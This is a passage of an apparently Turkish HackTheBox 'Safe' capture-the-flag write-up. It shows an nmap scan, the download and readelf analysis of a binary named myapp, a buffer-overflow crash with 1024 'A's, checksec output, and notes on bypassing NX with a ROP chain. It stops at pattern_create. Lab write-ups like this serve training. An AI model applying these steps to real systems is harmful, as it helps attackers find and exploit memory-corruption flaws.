I"f<hr />
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># nmap -sS -sV -p- -A 10.10.10.147                                                                                                     </span>
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-10-16 11:08 +03
Nmap scan report <span class="k">for </span>safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
Host is up <span class="o">(</span>0.067s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de <span class="o">(</span>RSA<span class="o">)</span>
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Apache2 Debian Default Page: It works
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP: 
|     04:09:35 up 21 min, 0 <span class="nb">users</span>, load average: 0.06, 0.01, 0.00
|   DNSVersionBindReqTCP: 
|     04:09:30 up 21 min, 0 <span class="nb">users</span>, load average: 0.06, 0.02, 0.00
|   GenericLines: 
|     04:09:18 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
|   GetRequest: 
|     04:09:25 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? GET / HTTP/1.0
|   HTTPOptions: 
|     04:09:25 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? OPTIONS / HTTP/1.0
|   Help: 
|     04:09:40 up 21 min, 0 <span class="nb">users</span>, load average: 0.05, 0.01, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? HELP
|   NULL: 
|     04:09:18 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|   RPCCheck: 
|     04:09:25 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|   RTSPRequest: 
|     04:09:25 up 21 min, 0 <span class="nb">users</span>, load average: 0.07, 0.02, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back? OPTIONS / RTSP/1.0
|   SSLSessionReq: 
|     04:09:40 up 21 min, 0 <span class="nb">users</span>, load average: 0.05, 0.01, 0.00
|     What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
|   TLSSessionReq, TerminalServerCookie: 
|     04:09:41 up 21 min, 0 <span class="nb">users</span>, load average: 0.05, 0.01, 0.00
|_    What <span class="k">do </span>you want me to <span class="nb">echo </span>back?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>10/16%Time<span class="o">=</span>5DA6D03F%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
SF:ULL,3F,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:18</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load
SF:</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,64,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004
SF::09:18</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">
SF:200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">2
SF:0echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,72,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:25</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20
SF:min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,</span><span class="se">\x</span><span class="s2">20
SF:0</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20GET
SF:</span><span class="se">\x</span><span class="s2">20/</span><span class="se">\x</span><span class="s2">20HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,76,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:25</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20
SF:min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,</span><span class="se">\x</span><span class="s2">20
SF:0</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20OPT
SF:IONS</span><span class="se">\x</span><span class="s2">20/</span><span class="se">\x</span><span class="s2">20HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,76,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:25</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021
SF:</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,
SF:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">2
SF:0OPTIONS</span><span class="se">\x</span><span class="s2">20/</span><span class="se">\x</span><span class="s2">20RTSP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>RPCCheck,3F,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:25</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">202
SF:1</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">07,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02
SF:,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSVersionBindReqTCP,3F,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:30</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20m
SF:in,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">06,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">02,</span><span class="se">\x</span><span class="s2">200
SF:</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>DNSStatusRequestTCP,3F,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:35</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">06,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">01,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n</span><span class="s2">"</span>
SF:<span class="o">)</span>%r<span class="o">(</span>Help,68,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:40</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">2
SF:0load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">05,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">01,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20
SF:want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20HELP</span><span class="se">\r\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,65,<span class="s2">"</span><span class="se">\x</span><span class="s2">
SF:2004:09:40</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20averag
SF:e:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">05,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">01,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20t
SF:o</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">03</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TerminalServerCookie,64,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:0
SF:9:41</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\x</span><span class="s2">20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">20
SF:0</span><span class="se">\.</span><span class="s2">05,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">01,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20e
SF:cho</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">03</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>%r<span class="o">(</span>TLSSessionReq,65,<span class="s2">"</span><span class="se">\x</span><span class="s2">2004:09:41</span><span class="se">\x</span><span class="s2">20up</span><span class="se">\x</span><span class="s2">2021</span><span class="se">\</span><span class="s2">
SF:x20min,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">200</span><span class="se">\x</span><span class="s2">20users,</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">20load</span><span class="se">\x</span><span class="s2">20average:</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">05,</span><span class="se">\x</span><span class="s2">200</span><span class="se">\.</span><span class="s2">01,</span><span class="se">\</span><span class="s2">
SF:x200</span><span class="se">\.</span><span class="s2">00</span><span class="se">\n\n</span><span class="s2">What</span><span class="se">\x</span><span class="s2">20do</span><span class="se">\x</span><span class="s2">20you</span><span class="se">\x</span><span class="s2">20want</span><span class="se">\x</span><span class="s2">20me</span><span class="se">\x</span><span class="s2">20to</span><span class="se">\x</span><span class="s2">20echo</span><span class="se">\x</span><span class="s2">20back</span><span class="se">\?\x</span><span class="s2">20
SF:</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">03</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
No exact OS matches <span class="k">for </span>host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span><span class="nb">.</span>
TCP/IP fingerprint:
OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.80%E<span class="o">=</span>4%D<span class="o">=</span>10/16%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>32050%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>5DA6D0
OS:A1%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>106%GCD<span class="o">=</span>1%ISR<span class="o">=</span>106%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>OP
OS:S<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M54DST11NW7%O2<span class="o">=</span>M54DST11NW7%O3<span class="o">=</span>M54DNNT11NW7%O4<span class="o">=</span>M54DST11NW7%O5<span class="o">=</span>M54DST
OS:11NW7%O6<span class="o">=</span>M54DST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>7120%W2<span class="o">=</span>7120%W3<span class="o">=</span>7120%W4<span class="o">=</span>7120%W5<span class="o">=</span>7120%W6<span class="o">=</span>7120<span class="o">)</span>EC
OS:N<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>7210%O<span class="o">=</span>M54DNNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>
OS:AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span>
OS:R<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%
OS:F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N
OS:%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%C
OS:D<span class="o">=</span>S<span class="o">)</span>

Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 1025/tcp<span class="o">)</span>
HOP RTT      ADDRESS
1   66.05 ms 10.10.14.1
2   66.06 ms safe.htb <span class="o">(</span>10.10.10.147<span class="o">)</span>
</code></pre></div></div>
<hr />
<p><img src="http://localhost:4000/assets/myapp.png" alt="alt text" /></p>
<h5 id="kaynak-kodda-myapp-isimli-bir-uygulamanın-olduğu-söyleniyor">Kaynak kodda myapp isimli bir uygulamanın olduğu söyleniyor</h5>
<hr />
<hr />
<hr />
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c">#  curl -s -O 10.10.10.147/myapp</span>
</code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># readelf -a myapp | grep DEFAULT                                                                                                                                       root@0x67616e67</span>
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">printf</span>@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     5: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.2.5 <span class="o">(</span>2<span class="o">)</span>
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 00000000004002a8     0 SECTION LOCAL  DEFAULT    1 
     2: 00000000004002c4     0 SECTION LOCAL  DEFAULT    2 
     3: 00000000004002e4     0 SECTION LOCAL  DEFAULT    3 
     4: 0000000000400308     0 SECTION LOCAL  DEFAULT    4 
     5: 0000000000400328     0 SECTION LOCAL  DEFAULT    5 
     6: 00000000004003d0     0 SECTION LOCAL  DEFAULT    6 
     7: 0000000000400420     0 SECTION LOCAL  DEFAULT    7 
     8: 0000000000400430     0 SECTION LOCAL  DEFAULT    8 
     9: 0000000000400450     0 SECTION LOCAL  DEFAULT    9 
    10: 0000000000400480     0 SECTION LOCAL  DEFAULT   10 
    11: 0000000000401000     0 SECTION LOCAL  DEFAULT   11 
    12: 0000000000401020     0 SECTION LOCAL  DEFAULT   12 
    13: 0000000000401070     0 SECTION LOCAL  DEFAULT   13 
    14: 0000000000401214     0 SECTION LOCAL  DEFAULT   14 
    15: 0000000000402000     0 SECTION LOCAL  DEFAULT   15 
    16: 000000000040203c     0 SECTION LOCAL  DEFAULT   16 
    17: 0000000000402080     0 SECTION LOCAL  DEFAULT   17 
    18: 0000000000403e10     0 SECTION LOCAL  DEFAULT   18 
    19: 0000000000403e18     0 SECTION LOCAL  DEFAULT   19 
    20: 0000000000403e20     0 SECTION LOCAL  DEFAULT   20 
    21: 0000000000403ff0     0 SECTION LOCAL  DEFAULT   21 
    22: 0000000000404000     0 SECTION LOCAL  DEFAULT   22 
    23: 0000000000404038     0 SECTION LOCAL  DEFAULT   23 
    24: 0000000000404048     0 SECTION LOCAL  DEFAULT   24 
    25: 0000000000000000     0 SECTION LOCAL  DEFAULT   25 
    26: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    27: 00000000004010b0     0 FUNC    LOCAL  DEFAULT   13 deregister_tm_clones
    28: 00000000004010e0     0 FUNC    LOCAL  DEFAULT   13 register_tm_clones
    29: 0000000000401120     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
    30: 0000000000404048     1 OBJECT  LOCAL  DEFAULT   24 completed.7325
    31: 0000000000403e18     0 OBJECT  LOCAL  DEFAULT   19 __do_global_dtors_aux_fin
    32: 0000000000401150     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
    33: 0000000000403e10     0 OBJECT  LOCAL  DEFAULT   18 __frame_dummy_init_array_
    34: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS example1.c
    35: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtstuff.c
    36: 000000000040219c     0 OBJECT  LOCAL  DEFAULT   17 __FRAME_END__
    37: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    38: 0000000000403e18     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_end
    39: 0000000000403e20     0 OBJECT  LOCAL  DEFAULT   20 _DYNAMIC
    40: 0000000000403e10     0 NOTYPE  LOCAL  DEFAULT   18 __init_array_start
    41: 000000000040203c     0 NOTYPE  LOCAL  DEFAULT   16 __GNU_EH_FRAME_HDR
    42: 0000000000404000     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    43: 0000000000401210     1 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
    44: 0000000000404038     0 NOTYPE  WEAK   DEFAULT   23 data_start
    45: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@@GLIBC_2.2.5
    46: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    48: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.2.5
    49: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND <span class="nb">printf</span>@@GLIBC_2.2.5
    50: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    51: 0000000000404038     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    52: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    54: 0000000000402000     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    56: 00000000004011b0    93 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    57: 0000000000404050     0 NOTYPE  GLOBAL DEFAULT   24 _end
    59: 0000000000401070    43 FUNC    GLOBAL DEFAULT   13 _start
    60: 0000000000404048     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    61: 000000000040115f    78 FUNC    GLOBAL DEFAULT   13 main
    64: 0000000000401152    13 FUNC    GLOBAL DEFAULT   13 <span class="nb">test</span>
</code></pre></div></div>
<h5 id="kaynak-kod-tarafında-main-ve-test-fonksiyonları-tanımlı">Kaynak kod tarafında main() ve test() fonksiyonları tanımlı</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># python -c 'print "A"*1024' | ./myapp                                                                                                                                  </span>
 12:24:01 up  3:53,  1 user,  load average: 0.59, 0.91, 1.20
What <span class="k">do </span>you want me to <span class="nb">echo </span>back
<span class="o">[</span>1]    18433 <span class="k">done                </span>python <span class="nt">-c</span> <span class="s1">'print "A"*1024'</span> | 
       18434 segmentation fault  ./myapp
</code></pre></div></div>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/Safe <span class="c"># gdb myapp</span>
gdb-peda<span class="nv">$ </span>checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
</code></pre></div></div>
<h5 id="nx-aktif-durumda-olduğu-için-rop-chain-saldırısı-yapabilmek-adına-öncelikle-dep-bypass-yapılması-gerekir">NX aktif durumda olduğu için rop chain saldırısı yapabilmek adına öncelikle DEP bypass yapılması gerekir.</h5>
<h5 id="gdb-peda-multithread-uygulamaları-çalıştırırken-fork-tarafında-soru-çıkarttığı-için-set-follow-fork-mode-parent-yazmakta-fayda-var">gdb-peda multithread uygulamaları çalıştırırken fork tarafında soru çıkarttığı için <code><i>set follow-fork-mode parent</i></code> yazmakta fayda var.</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span><span class="nb">set </span>follow-fork-mode parent
</code></pre></div></div>
<h5 id="pattern_create-1024-ile-1024-karakterlik-random-array-üretiyoruz-sonrasında-stacki-taştırıp-hangi-offsetten-taştığına-bakacağız-böylelikle-kaynak-kodda-bufferin-kaç-karakter-tanımlı-olduğunu-öğreneceğiz">pattern_create 1024 ile 1024 karakterlik random array üretiyoruz. Sonrasında stacki taştırıp, hangi offsetten taştığına bakacağız. Böylelikle kaynak kodda bufferin kaç karakter tanımlı olduğunu öğreneceğiz.</h5>
<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>pattern_create 1024
